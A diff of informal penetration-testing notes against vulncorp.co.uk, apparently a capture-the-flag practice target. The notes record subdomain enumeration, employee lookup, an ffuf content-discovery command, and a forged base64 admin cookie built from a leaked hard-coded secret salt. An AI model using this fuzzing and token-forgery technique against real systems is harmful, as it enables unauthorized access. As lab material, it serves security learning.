@@ -11,6 +11,10 @@ chat.vulncorp.co.uk
 webmail.vulncorp.co.uk
 prueba.vulncorp.co.uk
 
+//googling employees...
+Danni Latowski on linkdin
+#9 FLAG Found
+
 ----------------chat.vulncorp.co.uk-----------------------------------------
 //Creating new account
 api: 
@@ -27,16 +31,22 @@ Api key: YTE0NTZiNDQ4MDEyN2E0ZTllYTFmZTYyOGEyMmJhNDVjNTQ0NjVhNzEzOTFkOTk1YWIwYWN
 "id":928,"disabled":false,"name":"No Name","email":"wiroh76111@eosbuzz.com"
 
 ----------------webmail.vulncorp.co.uk/login--------------------------------
+//probably corp mail.
 
+----------------prueba.vulncorp.co.uk---------------------------------------
+//need username and password. 
 
 ----------------Content discovery-------------------------------------------
 ffuf -H "Cookie: "  -w ~/wordlists/content.txt -u "http://vulncorp.co.uk/FUZZ" -t 1 -p 0.1 -mc all -fc 404 -c
 
 vulncorp.co.uk/ admin, contact, css, images, js, phpmyadmin
 
-----------------------------stats-------------------------------------------
-//Server Status
-
-#2 FLAG Found
-
----------------------------main page----------------------------------------
+----------------vulncorp.co.uk/admin----------------------------------------
+token encoding for admin/dashboard:
+ $json = json_decode( urldecode(base64_decode($_COOKIE["token"])), true );
+ $json["auth"] ==  md5( $json["challenge"].'s4cre4log1nStinG4T3mpl4tem4Ngaer')
+ //We can create a token...
+ //Set-Cookie: token=JTdCJTIyY2hhbGxlbmdlJTIyJTNBJTIyMSUyMiUyQyUyMmF1dGglMjIlM0ElMjJiMGY1MjkxY2ZkOGM4NDZiYjExM2E5ZDRlM2Y1ZTk5NyUyMiU3RA==
+ --------------vulncorp.co.uk/phpmyadmin--------------------------------------
+ //index.php found
+ 
